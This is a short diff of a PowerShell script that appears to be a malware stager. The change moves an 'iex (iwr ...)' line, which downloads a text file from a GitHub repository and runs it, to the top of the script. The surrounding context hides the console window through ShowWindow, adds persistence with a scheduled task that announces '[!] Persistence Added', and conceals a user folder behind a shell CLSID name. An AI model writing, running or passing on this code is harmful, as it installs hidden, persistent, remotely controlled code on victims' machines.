@@ -1,3 +1,4 @@
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt" -useb)
 Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
@@ -23,7 +24,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt" -useb)
+
 
 $rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
